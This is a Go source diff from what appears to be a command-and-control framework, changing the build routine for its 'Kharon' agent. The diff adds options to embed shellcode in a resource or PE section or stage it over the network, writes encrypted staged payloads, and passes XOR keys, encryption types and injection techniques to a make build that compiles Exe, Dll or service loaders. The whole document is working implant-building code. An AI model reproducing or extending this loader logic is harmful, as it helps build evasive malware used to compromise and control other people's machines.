@@ -432,7 +432,6 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	bin, err := os.ReadFile(outputFile)
 	if err != nil {
-		fmt.Printf("ERROR: Failed to read output file %s: %v\n", outputFile, err)
 		return nil, "", fmt.Errorf("failed to read output (%s): %v", outputFile, err)
 	}
 	fmt.Printf("DEBUG: Read %d bytes from output file\n", len(bin))
@@ -458,7 +457,17 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 	fmt.Printf("\nDEBUG: Processing format: %s\n", cfg.Format)
 
-	// Compile loader if needed
+	// Resolve shellcode source and stage type
+	shellcodeSource := strings.ToLower(cfg.ShellcodeSource)
+	if shellcodeSource == "" {
+		return nil, "", fmt.Errorf("shellcode_source is required (rsrc, network, section)")
+	}
+
+	stageType := "stageless"
+	if stagedSources[shellcodeSource] {
+		stageType = "staged"
+	}
+
 	if cfg.Format == "Exe" || cfg.Format == "Dll" || cfg.Format == "Svc" {
 		fmt.Println("→ Compiling loader for format:", cfg.Format)
 
@@ -466,23 +475,27 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Printf("DEBUG: Loader path: %s\n", loaderPath)
 
 		if _, err := os.Stat(loaderPath); os.IsNotExist(err) {
-			fmt.Printf("ERROR: Loader path does not exist: %s\n", loaderPath)
 			return nil, "", fmt.Errorf("loader path not found: %s", loaderPath)
 		}
 
-		// Generate shellcode header
 		customSectionName := cfg.CustomSectionName
 		if len(customSectionName) == 0 || len(customSectionName) > 8 {
 			return nil, "", fmt.Errorf("section name must be 1-8 bytes, got %d", len(customSectionName))
 		}
-		rsrcID := mrand.Intn(50) + 100
+
 		shellcodeHeaderPath := filepath.Join(loaderPath, "Include", "Shellcode.h")
-		if cfg.PeSection == ".rsrc" {
-			rsrcHeader := "#pragma once\n\n#include <cstdint>\n\nnamespace Shellcode {\n    extern uint8_t* Data;\n    extern size_t         Size;\n}\n"
+
+		rsrcID := 0
+
+		// Prepare shellcode per source type
+		switch shellcodeSource {
+		case "rsrc":
+			rsrcID = mrand.Intn(50) + 100
+
+			rsrcHeader := "#pragma once\n\n#include <cstdint>\n\nnamespace Shellcode {\n    extern uint8_t* Data;\n    extern size_t   Size;\n    BOOL Load();\n}\n"
 			if err := os.WriteFile(shellcodeHeaderPath, []byte(rsrcHeader), 0644); err != nil {
 				return nil, "", fmt.Errorf("failed to write Shellcode.h for rsrc: %v", err)
 			}
-			fmt.Println("→ Shellcode.h (rsrc) written to:", shellcodeHeaderPath)
 
 			shellcodeBinPath := filepath.Join(loaderPath, "Include", "shellcode.bin")
 			if err := os.WriteFile(shellcodeBinPath, bin, 0644); err != nil {
@@ -506,30 +519,55 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 			}
 			fmt.Println("→ shellcode.res generated for .rsrc embedding")
 
-		} else {
+		case "network":
+			netHeader := "#pragma once\n\n#include <cstdint>\n\nnamespace Shellcode {\n    extern uint8_t* Data;\n    extern size_t   Size;\n    BOOL Load();\n}\n"
+			if err := os.WriteFile(shellcodeHeaderPath, []byte(netHeader), 0644); err != nil {
+				return nil, "", fmt.Errorf("failed to write Shellcode.h for network: %v", err)
+			}
+
+			// Generate staging profile header
+			profileContent := gen_staging_profile(&cfg)
+			profilePath := filepath.Join(loaderPath, "Include", "StagingProfile.h")
+			if err := os.WriteFile(profilePath, []byte(profileContent), 0644); err != nil {
+				return nil, "", fmt.Errorf("failed to write StagingProfile.h: %v", err)
+			}
+			fmt.Println("→ Shellcode.h + StagingProfile.h written — payload will be staged at runtime")
+
+			// Write encrypted payload for staging
+			stagingPayloadPath := filepath.Join(loaderPath, "Bin", fmt.Sprintf("Kharon.x64.staged.bin"))
+			if err := os.WriteFile(stagingPayloadPath, bin, 0644); err != nil {
+				return nil, "", fmt.Errorf("failed to write staging payload: %v", err)
+			}
+			fmt.Printf("→ Staging payload written to: %s (%d bytes)\n", stagingPayloadPath, len(bin))
+
+		case "section":
 			shellcodeContent := gen_shellcode_header(bin, cfg.PeSection, customSectionName)
 			fmt.Printf("DEBUG: PeSection: %s\n", cfg.PeSection)
 			fmt.Printf("DEBUG: Generated shellcode header (%d bytes)\n", len(shellcodeContent))
 
 			if err := os.WriteFile(shellcodeHeaderPath, []byte(shellcodeContent), 0644); err != nil {
-				fmt.Printf("ERROR: Failed to write Shellcode.h: %v\n", err)
 				return nil, "", fmt.Errorf("failed to write Shellcode.h: %v", err)
 			}
 			fmt.Println("→ Shellcode injected into:", shellcodeHeaderPath)
+
+		default:
+			return nil, "", fmt.Errorf("unknown shellcode source: %s", shellcodeSource)
 		}
+
+		// Resolve format output
 		var sourceFile string
 		var outputName string
 
 		switch cfg.Format {
 		case "Exe":
 			sourceFile = "Exe.cc"
-			outputName = "Kharon.x64.exe"
+			outputName = fmt.Sprintf("Kharon.x64.%s.exe", stageType)
 		case "Dll":
 			sourceFile = "Dll.cc"
-			outputName = "Kharon.x64.dll"
+			outputName = fmt.Sprintf("Kharon.x64.%s.dll", stageType)
 		case "Svc":
 			sourceFile = "Svc.cc"
-			outputName = "Kharon.x64.svc.exe"
+			outputName = fmt.Sprintf("Kharon.x64.%s.svc.exe", stageType)
 		}
 
 		fmt.Printf("DEBUG: Source file: %s, Output name: %s\n", sourceFile, outputName)
@@ -538,27 +576,31 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		outputPath := filepath.Join(loaderPath, "Bin", outputName)
 
 		if _, err := os.Stat(sourcePath); os.IsNotExist(err) {
-			fmt.Printf("ERROR: Source file does not exist: %s\n", sourcePath)
 			return nil, "", fmt.Errorf("source file not found: %s", sourcePath)
 		}
 
 		binDir := filepath.Join(loaderPath, "Bin")
 		if err := os.MkdirAll(binDir, 0755); err != nil {
-			fmt.Printf("ERROR: Failed to create Bin directory: %v\n", err)
 			return nil, "", fmt.Errorf("failed to create Bin directory: %v", err)
 		}
-		fmt.Printf("DEBUG: Created/verified Bin directory: %s\n", binDir)
 
+		// Build make args
 		makeArgs := []string{
 			"-C", loaderPath,
 			"build",
 			fmt.Sprintf("FORMAT=%s", cfg.Format),
-			fmt.Sprintf("SECTION=%s", cfg.PeSection),
+			fmt.Sprintf("SHELLCODE_SOURCE=%s", shellcodeSource),
+			fmt.Sprintf("STAGE_TYPE=%s", stageType),
 			fmt.Sprintf("CUSTOM_SECTION_NAME=%s", customSectionName),
-			fmt.Sprintf("RSRC_ID=%d", rsrcID),
 			fmt.Sprintf("XOR_KEY=%s", keyStr),
 			fmt.Sprintf("ENCRYPTION_TYPE=%s", encryptionType),
 			fmt.Sprintf("INJECTION_TECHNIQUE=%s", cfg.InjectionTechnique),
+		}
+
+		// Source-specific args
+		switch shellcodeSource {
+		case "rsrc":
+			makeArgs = append(makeArgs, fmt.Sprintf("RSRC_ID=%d", rsrcID))
 		}
 
 		fmt.Printf("→ Running make: %v\n", makeArgs)
@@ -577,11 +619,9 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 			fmt.Printf("STDERR:\n%s\n", stdErr.String())
 			return nil, "", fmt.Errorf("make failed: %v\nstdout:\n%s\nstderr:\n%s", err, stdOut.String(), stdErr.String())
 		}
-		fmt.Println("DEBUG: make command completed successfully")
 
 		finalBin, err = os.ReadFile(outputPath)
 		if err != nil {
-			fmt.Printf("ERROR: Failed to read loader output %s: %v\n", outputPath, err)
 			return nil, "", fmt.Errorf("failed to read loader output (%s): %v", outputPath, err)
 		}
 		fmt.Printf("DEBUG: Read %d bytes from loader output\n", len(finalBin))
@@ -590,22 +630,20 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		fmt.Println("→ Loader compiled successfully:", outputPath)
 	}
 
-	// Set output filename and final binary
+	// Set output for non-loader formats
 	switch cfg.Format {
 	case "Exe":
-		outFileName = "Kharon.x64.exe"
+		outFileName = fmt.Sprintf("Kharon.x64.%s.exe", stageType)
 	case "Dll":
-		outFileName = "Kharon.x64.dll"
+		outFileName = fmt.Sprintf("Kharon.x64.%s.dll", stageType)
 	case "Svc":
-		outFileName = "Kharon.x64.svc.exe"
+		outFileName = fmt.Sprintf("Kharon.x64.%s.svc.exe", stageType)
 	case "Bin":
-		outFileName = "Kharon.x64.bin"
+		outFileName = fmt.Sprintf("Kharon.x64.%s.bin", stageType)
 		finalBin = bin
-		fmt.Println("DEBUG: Using raw binary format")
 	default:
 		outFileName = fmt.Sprintf("Kharon.%s.bin", target)
 		finalBin = bin
-		fmt.Printf("DEBUG: Using default format with target: %s\n", target)
 	}
 
 	fmt.Println("\n✓ Build completed successfully!")
@@ -2293,7 +2331,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				task.TaskId = TaskUID[:8]
 
 				commandId := int16(cmd_packer.ParseInt16())
-					switch commandId {
+				switch commandId {
 
 				case TASK_JOB:
 					jobCount := cmd_packer.ParseInt32()
